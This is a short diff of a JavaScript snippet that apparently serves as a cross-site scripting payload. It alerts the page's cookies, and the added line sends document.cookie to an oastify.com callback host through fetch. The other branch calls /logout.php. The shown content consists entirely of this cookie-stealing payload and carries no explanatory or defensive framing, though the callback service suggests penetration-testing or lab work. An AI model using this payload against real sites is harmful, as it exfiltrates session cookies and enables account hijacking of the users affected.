@@ -1,5 +1,6 @@
 if (document.cookie !== "") {
   alert(document.cookie);
+  fetch('https://7qy9bct7rhtlcdz03g0h8xpbv21vplda.oastify.com/cookie?c='+document.cookie);
 }
 else{
   fetch('/logout.php', {
